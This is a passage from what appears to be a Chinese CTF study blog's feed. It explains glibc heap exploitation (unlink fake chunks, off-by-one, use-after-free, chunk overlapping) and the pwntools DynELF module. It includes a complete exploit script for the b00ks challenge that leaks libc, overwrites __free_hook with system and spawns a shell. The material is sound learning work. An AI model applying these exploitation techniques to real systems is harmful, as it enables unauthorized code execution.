            <tag> 学习记录 </tag>
            
            <tag> 堆 </tag>
            
            <tag> 堆利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用-1</title>
      <link href="/posts/61329/"/>
      <url>/posts/61329/</url>
      
        <content type="html"><![CDATA[<span class='p blue h4'>四个基础漏洞，其他利用方式大多要用到它们</span><h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><p><strong>unlink宏</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);      \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;      \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;      \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))      \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \</span></span><br><span class="line"><span class="meta">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   \</span></span><br><span class="line"><span class="meta">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)      \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                  &#125;      \</span></span><br><span class="line"><span class="meta">              &#125; <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">              &#125;      \</span></span><br><span class="line"><span class="meta">          &#125;      \</span></span><br><span class="line"><span class="meta">      &#125;      \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure><p>对于非largebin来说有两次检查</p><p>可以看到<code>unlink()</code>函数首先检查当前 chunk 的 size 和下一个 chunk 的 prev_size 是否相等。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br></pre></td></tr></table></figure><p>检查后一个 chunk 的 bk 和前一个 chunk 的 fd 是否指向当前 chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != p || BK-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><strong>本节只是简要的过一遍流程,这部分知识网上很全,学习过程中一定要注意讲解中提到的指针和地址的区别(虽然指针和地址其实是一个东西)</strong></p><p>我们先假设伪造了一个 fake chunk 可以成功利用 unlink。这时我们可以通过溢出的方式将某个 chunk 的 prev_size 改写成这个 chunk 到 fake chunk 的距离，并将 size 的 P 位改成 0，然后对该 chunk 进行<code>free()</code>，就触发了后向合并，此时会对 fake chunk 进行 unlink。</p><p>我们如何利用 unlink 呢？我们伪造的 fake chunk 需要满足<code>FD-&gt;bk == p &amp;&amp; BK-&gt;fd == p</code>，才能让<code>FD-&gt;bk = BK;BK-&gt;fd = FD;</code>。如果我们有一个指向 fake chunk 的指针的地址时好像就有办法了。我们先设指向 fake chunk 的指针为<code>ptr</code>，然后构造一个这样的 fake chunk：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd = &amp;ptr<span class="number">-0x18</span>;</span><br><span class="line">bk = &amp;ptr<span class="number">-0x10</span>;</span><br></pre></td></tr></table></figure><p>此时的FD和BK:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD == &amp;ptr<span class="number">-0x18</span>;</span><br><span class="line">BK == &amp;ptr<span class="number">-0x10</span>;</span><br></pre></td></tr></table></figure><p>在 unlink 执行检查时，发现满足条件，成功通过检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk == *(&amp;ptr<span class="number">-0x18</span>+<span class="number">0x18</span>) == p;</span><br><span class="line">BK-&gt;fd == *(&amp;ptr<span class="number">-0x10</span>+<span class="number">0x10</span>) == p;</span><br></pre></td></tr></table></figure><p>执行 unlink，最后<code>ptr</code>指向<code>&amp;ptr-0x18</code>处的位置：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// FD-&gt;bk = BK</span></span><br><span class="line"><span class="comment">// *(&amp;ptr-0x10+0x10) = &amp;ptr-0x10;</span></span><br><span class="line">ptr = &amp;ptr<span class="number">-0x10</span>;</span><br><span class="line"><span class="comment">// BK-&gt;fd = FD</span></span><br><span class="line"><span class="comment">// *(&amp;ptr-0x10+0x10) = &amp;ptr-0x18</span></span><br><span class="line">ptr = &amp;ptr<span class="number">-0x18</span></span><br></pre></td></tr></table></figure><p>从利用原理不难看出,利用的一个前提是我们要能够知道该堆块指针的地址(最好是在bss段)</p><p>自己粗糙地画了一幅图,是全部操作完成后的示意图</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-28_213612.png" alt=""></p><p>可以看到本来指向heap地ptr1指针,指向了自己地址的-0x18处</p><details class="folding-tag" yellow><summary> 关于指针加减法 </summary>              <div class='content'>              <p>其实&amp;ptr1-0x18这类写法是不正确的，这样写真正代表的意思是ptr1的地址加上0x18*sizeof(&amp;ptr1所指向的类型)</p><p>一定要这样写的话应该是(long long)&amp;ptr1-0x18</p>              </div>            </details><hr><p>还有一些特殊的利用中</p><p>会使用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd=p;</span><br><span class="line">p-&gt;bk=p;</span><br></pre></td></tr></table></figure><p>来绕过unlink检测</p><hr><p><strong><em><u>重点!!!:</u></em></strong></p><p>unlink过程中使用的chunk地址<strong>是chunk真实起始地址</strong>,而不是用户可用区域地址,</p><p>但是<strong>程序</strong>全局变量中存储的一定是<strong>用户可用区域指针</strong>,</p><p>所以一定要在真实chunk后立即伪造一个chunk紧跟其后(记得绕过<code>chunksize (p) != prev_size (next_chunk (p))</code>),并修改触发unlink的那个chunk,使得最终被unlink的chunk是这个伪造的chunk,那么其计算得到的伪真实地址其实就是真正的用户可用地址,从而与全局变量相对应</p><p>unlink后新产生的chunk会被链入unsorted bin</p><hr><h1 id="off—by—one"><a href="#off—by—one" class="headerlink" title="off—by—one"></a>off—by—one</h1><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p><ul><li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li><li>字符串操作不合适</li></ul><p>其又分为两种</p><ol><li><strong>off-by-one</strong></li><li><strong>off-by-null</strong></li></ol><p>其中第一类包含第二类</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>这三篇我觉得很不错</p><h3 id="Asis-CTF-2016-b00ks"><a href="#Asis-CTF-2016-b00ks" class="headerlink" title="Asis CTF 2016 b00ks"></a>Asis CTF 2016 b00ks</h3><p><a href="https://blog.csdn.net/qq_41202237/article/details/108116618">好好说话之off-by-one_hollk的博客-CSDN博客</a></p><p>不过实操时，发现跟这篇博客出入挺大，不知道是不是环境的问题，最终用的另一种方法做出</p><p>exp参考</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">local_path = <span class="string">&#x27;./b00ks&#x27;</span></span><br><span class="line">io = process(local_path)</span><br><span class="line"><span class="comment"># libc = io.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.binary = local_path</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">option</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(option)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enter_author_name</span>(<span class="params">author_name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(author_name)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">name_sz, name, dscr_sz, dscr</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(name_sz)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(dscr_sz)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(dscr)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(idx)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, dscr</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(idx)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(dscr)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printbook</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(idx):</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        bookID = <span class="built_in">int</span>(io.recvline()[<span class="number">1</span>:-<span class="number">1</span>])</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        name = io.recvline()[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        dscr = io.recvline()[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">        author = io.recvline()[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> bookID, name, dscr, author</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">author_name</span>):</span><br><span class="line">    menu(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    enter_author_name(author_name)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># off by one to leak addr of book1</span></span><br><span class="line">enter_author_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"> </span><br><span class="line">create(<span class="string">b&#x27;32&#x27;</span>, <span class="string">b&#x27;book1&#x27;</span>, <span class="string">b&#x27;64&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">bookID1, name1, dscr1, author1 = printbook(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">book1_addr = unpack(author1[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;leak book1_addr:&quot;</span> + <span class="built_in">hex</span>(book1_addr))</span><br><span class="line"> </span><br><span class="line">create(<span class="string">b&#x27;32&#x27;</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>, <span class="string">b&#x27;135168&#x27;</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">gdb.attach(io)  </span><br><span class="line"><span class="comment"># construct fake book1 to leak addr of book2</span></span><br><span class="line">fakebook = pack(<span class="number">1</span>) + pack(book1_addr+<span class="number">0x70</span>) + pack(book1_addr-<span class="number">0x50</span>) + pack(<span class="number">100</span>)</span><br><span class="line"> </span><br><span class="line">pad = cyclic(<span class="number">32</span>)</span><br><span class="line"> </span><br><span class="line">payload1 = pad + fakebook</span><br><span class="line"> </span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>, payload1)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># off by null to point at fake book1</span></span><br><span class="line">change(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"> </span><br><span class="line">bookID1, name1, dscr1, author1 = printbook(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">mmap_addr = unpack(name1.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;leak mmap_addr:&quot;</span> + <span class="built_in">hex</span>(mmap_addr))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"> </span><br><span class="line">libc_base = mmap_addr + <span class="number">0x22000</span> - <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;leak libc_base:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"> </span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook_addr = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"> </span><br><span class="line">fakebook = pack(<span class="number">1</span>) + pack(book1_addr+<span class="number">0x70</span>) + pack(free_hook_addr) + pack(<span class="number">100</span>)</span><br><span class="line">payload2 = pad + fakebook</span><br><span class="line"> </span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>, payload2)</span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>, pack(system_addr))</span><br><span class="line"> </span><br><span class="line">delete(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="2018强网杯gambox"><a href="#2018强网杯gambox" class="headerlink" title="2018强网杯gambox"></a>2018强网杯gambox</h3><p><a href="https://www.freebuf.com/news/168064.html">CTF经验 | Off-By-One相关知识点浅析 - FreeBuf网络安全行业门户</a></p><h3 id="V-amp-N2020招新赛simpleheap"><a href="#V-amp-N2020招新赛simpleheap" class="headerlink" title="V&amp;N2020招新赛simpleheap"></a>V&amp;N2020招新赛simpleheap</h3><p><a href="https://zhuanlan.zhihu.com/p/371413926">快速入门堆溢出技巧(OFF BY ONE) - 知乎 (zhihu.com)</a></p><h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><p>uaf 漏洞产生的主要原因是释放了一个堆块后，并没有将该指针置为 NULL，这样导致该指针处于悬空的状态，同样被释放的内存如果被恶意构造数据，就有可能会被利用。</p><ul><li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</li></ul><p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong></p><h1 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h1><p>chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。这种利用方法需要以下的时机和条件：</p><ul><li>程序中存在基于堆的漏洞</li><li>漏洞可以控制 chunk header 中的数据</li></ul><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>chunk extend 技术能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏。</p><p>在 ptmalloc 中，获取 chunk 块大小的操作如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* Get size, ignoring use bits */</span><br><span class="line">#define chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span><br><span class="line"></span><br><span class="line">/* Like chunksize, but do not mask SIZE_BITS.  */</span><br><span class="line">#define chunksize_nomask(p) ((p)-&gt;mchunk_size)</span><br></pre></td></tr></table></figure><p>一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。</p><p>在 ptmalloc 中，<strong>获取下一 chunk 块</strong>地址的操作如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/* Ptr to next physical malloc_chunk. */</span><br><span class="line">#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span><br></pre></td></tr></table></figure><p>即使用<strong>当前块指针加上当前块大小。</strong></p><p>在 ptmalloc 中，<strong>获取前一个 chunk</strong> 信息的操作如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span><br><span class="line">#define prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><span class="line"></span><br><span class="line">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span><br><span class="line">#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span><br></pre></td></tr></table></figure><p>即通过 <strong>malloc_chunk-&gt;prev_size 获取前一块大小</strong>，然后使用本 chunk 地址减去所得大小。</p><p>在 ptmalloc，<strong>判断当前 chunk 是否是 use</strong> 状态的操作如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define inuse(p)</span><br><span class="line">    ((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure><p>即<strong>查看下一 chunk 的 prev_inuse 域</strong>，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。</p><p>通过上面几个宏可以看出，ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位。简而言之，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的。</p><p>与 chunk extend 类似的还有一种称为 chunk shrink 的操作。。</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> 堆 </tag>
            
            <tag> 堆利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn技巧-DynELF</title>
      <link href="/posts/69471/"/>
      <url>/posts/69471/</url>
      
        <content type="html"><![CDATA[<h1 id="DynELF"><a href="#DynELF" class="headerlink" title="DynELF"></a>DynELF</h1><p>DynELF是pwntools中专门用来应对没有libc情况的漏洞利用模块，在提供一个目标程序任意地址内存泄漏函数的情况下，可以解析任意加载库的任意符号地址。</p><p><strong>其原理就是通过程序漏洞泄露出任意地址内容，结合ELF文件的结构特征获取对应版本文件并计算对比出目标符号在内存中的地址</strong></p><h2 id="适用情况"><a href="#适用情况" class="headerlink" title="适用情况"></a>适用情况</h2><p>DynELF泄露函数方法最方便的使用情况是程序中最好含有write函数且可以多次调用main函数，不然的话还是用LibcSearcher的方法泄露比较好</p><h2 id="引例"><a href="#引例" class="headerlink" title="引例"></a>引例</h2><h3 id="官方文档给的例子"><a href="#官方文档给的例子" class="headerlink" title="官方文档给的例子"></a>官方文档给的例子</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Assume a process or remote connection</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwnme&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Declare a function that takes a single address, and</span></span><br><span class="line"><span class="comment"># leaks at least one byte at that address.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">    data = p.read(address, <span class="number">4</span>)</span><br><span class="line">    log.debug(<span class="string">&quot;%#x =&gt; %s&quot;</span>, address, enhex(data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># For the sake of this example, let&#x27;s say that we</span></span><br><span class="line"><span class="comment"># have any of these pointers.  One is a pointer into</span></span><br><span class="line"><span class="comment"># the target binary, the other two are pointers into libc</span></span><br><span class="line">main   = <span class="number">0xfeedf4ce</span></span><br><span class="line">libc   = <span class="number">0xdeadb000</span></span><br><span class="line">system = <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># With our leaker, and a pointer into our target binary,</span></span><br><span class="line"><span class="comment"># we can resolve the address of anything.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># We do not actually need to have a copy of the target</span></span><br><span class="line"><span class="comment"># binary for this to work.</span></span><br><span class="line">d = DynELF(leak, main)</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="literal">None</span>,     <span class="string">&#x27;libc&#x27;</span>) == libc</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>) == system</span><br><span class="line"></span><br><span class="line"><span class="comment"># However, if we *do* have a copy of the target binary,</span></span><br><span class="line"><span class="comment"># we can speed up some of the steps.</span></span><br><span class="line">d = DynELF(leak, main, elf=ELF(<span class="string">&#x27;./pwnme&#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="literal">None</span>,     <span class="string">&#x27;libc&#x27;</span>) == libc</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>) == system</span><br><span class="line"></span><br><span class="line"><span class="comment"># Alternately, we can resolve symbols inside another library,</span></span><br><span class="line"><span class="comment"># given a pointer into it.</span></span><br><span class="line">d = DynELF(leak, libc + <span class="number">0x1234</span>)</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">&#x27;system&#x27;</span>)      == system</span><br></pre></td></tr></table></figure><p><strong>log.debug(“%#x =&gt; %s”, address, enhex(data or ‘’))解释</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 